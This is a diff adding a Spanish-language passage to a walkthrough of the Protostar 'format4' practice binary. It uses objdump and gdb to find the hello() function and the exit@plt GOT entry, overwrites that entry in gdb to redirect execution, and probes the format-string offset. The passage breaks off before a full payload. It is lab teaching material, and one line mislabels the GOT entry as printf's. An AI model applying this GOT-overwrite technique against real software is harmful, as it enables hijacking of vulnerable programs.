@@ -226,6 +226,72 @@ $1 = 16930112
 you have modified the target :)
 ```
 
+---------------------------------------------------------------------------
+# Sobreescribir la GOT para saltar a una funcion que nos interese-> [format4](https://exploit.education/protostar/format-four/)
 
+Este binario al ejecutarlo se parece mucho a format2, pero no nos sale nada mas. Tambien, hay la vuln de format string. 
 
+```console
+[user@protostar]-[/opt/protostar/bin]:$ user@protostar:/opt/protostar/bin$ ./format4 AAA
+AAAA
+AAAA
+user@protostar:/opt/protostar/bin$ ./format2
+AAAA
+AAAA
+target is 0 :(
+user@protostar:/opt/protostar/bin$ ./format4
+AAAA
+AAAA
+user@protostar:/opt/protostar/bin$ python -c 'print("%8x."*5)' | ./format4
+200.b7fd8420.bffff524.2e783825.2e783825.
+```
+Solo que hay una función llamada "hello"
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ objdump -d ./format4
+080484b4 <hello>:
+80484b4:	55
+```
+Abrimos el programa con gdb y le echamos un vistazo.
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ gdb ./format4 
+(gdb) set disassembly-flavor intel
+(gdb) disas main
+Instrucciones de main entre ellas, saltar a vuln()
+0x0804851a <main+6>:	call   0x80484d2 <vuln>
+(gdb) disas vuln
+...
+0x0804850f <vuln+61>:	call   0x80483ec <exit@plt>
+(gdb) x/i 0x80483ec
+0x80483ec <exit@plt>:	jmp    DWORD PTR ds:0x8049724
+(gdb) x 0x8049724
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	repnz add DWORD PTR [eax+ecx*1],0x0
+```
+Yatenemos todas las direcciones que nos interesan, la de la funcion hello() y la de la llamada a GOT original (printf). Hau que sustituirla por la
+de hello(). En gdb es muy fácil
+
+```console
+(gdb) b *0x0804850f 
+(gdb) r
+Starting program: /opt/protostar/bin/format4 
+AAAA
+AAAA
+Breakpoint 1, 0x0804850f in vuln () at format4/format4.c:22
+(gdb) set {int}0x8049724=0x080484b4
+(gdb) c
+Continuing.
+code execution redirected! you win
+Program exited with code 01.
+```
+Hay que explotarlo con el format string. Ya adelanto que es el 4º argumento.
+> **%4$x"\*4** Escribir a partir del cuarto elemento (pero no en la memoria de ningun puntero de la pila como con %n sino en la pila en sí)
+
+```console
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x")' | ./format4
+AAAA41414141
+[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("AAAA" + "%4$x"*4)' | ./format4
+AAAA41414141414141414141414141414141
+```
+Para escribir en la primera entrada de exit plt (la que le dice a GOT que funcion llamar), se toma la direccion de exit de antes (0x8049724)
 
